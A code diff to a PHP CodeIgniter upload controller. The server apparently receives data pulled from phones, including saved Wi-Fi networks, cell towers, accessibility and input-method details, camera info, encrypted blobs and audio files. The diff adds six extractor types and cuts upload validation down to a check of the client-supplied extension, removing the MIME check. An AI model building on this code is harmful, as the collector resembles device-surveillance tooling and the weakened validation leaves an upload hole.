@@ -20,7 +20,7 @@ class Receive extends BaseController
 
     // Configuration for the file upload logic
     private $uploadConfig = [
-        'max_size'      => 104857600, // 10MB
+        'max_size'      => 83886080, // 80MB
         'allowed_types' => ['txt', 'enc', 'bin', 'jpg', 'jpeg', 'png', '3gp', 'mp3', 'wav'],
         'upload_path'   => WRITEPATH . 'uploads/text_dump/',
         'encrypt_name'  => true,
@@ -46,6 +46,8 @@ class Receive extends BaseController
         'processes', 'camera_info', 'battery_stats', 'accessibility', 'input_methods',
         // NEW: 9 additional extractors
         'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'data_usage', 'saved_wifi', 'default_apps', 'alarms',
+        // Group 1-6 new extractors
+        'hardware_graphics', 'hardware_network', 'app_security', 'network_security', 'telephony_network', 'system_locale',
     ];
 
 
@@ -552,6 +554,13 @@ class Receive extends BaseController
             'saved_wifi'     => 'parse_saved_wifi',
             'default_apps'   => 'parse_default_apps',
             'alarms'         => 'parse_alarms',
+            // Group 1-6 new extractors
+            'hardware_graphics'  => 'parse_hardware_graphics',
+            'hardware_network'   => 'parse_hardware_network',
+            'app_security'       => 'parse_app_security',
+            'network_security'   => 'parse_network_security',
+            'telephony_network'  => 'parse_telephony_network',
+            'system_locale'      => 'parse_system_locale',
         ];
 
         try {
@@ -622,32 +631,19 @@ class Receive extends BaseController
      */
     private function validateFile(\CodeIgniter\HTTP\Files\UploadedFile $file): bool
     {
-        // Check file size
         if ($file->getSize() > $this->uploadConfig['max_size']) {
+            log_message('error', 'validateFile: size exceeded. size=' . $file->getSize() . ' max=' . $this->uploadConfig['max_size']);
             return false;
         }
 
-        try {
-            // Check file extension
-            $extension = $file->getExtension();
-            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
-                return false;
-            }
+        // Use getClientExtension() — getExtension() returns MIME-based extension,
+        // which is wrong for encrypted binary files (e.g., .enc detected as .exe)
+        $extension = $file->getClientExtension();
+        $clientName = $file->getClientName();
 
-            // Check MIME type
-            $mimeType = $file->getMimeType();
-            $allowedMimes = ['text/plain', 'application/octet-stream'];
-            if (!in_array($mimeType, $allowedMimes)) {
-                return false;
-            }
-        } catch (\Exception $e) {
-            // Fallback validation
-            $originalName = $file->getClientName();
-            $extension = pathinfo($originalName, PATHINFO_EXTENSION);
-
-            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
-                return false;
-            }
+        if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
+            log_message('error', 'validateFile: extension "' . $extension . '" not allowed. clientName="' . $clientName . '"');
+            return false;
         }
 
         return true;
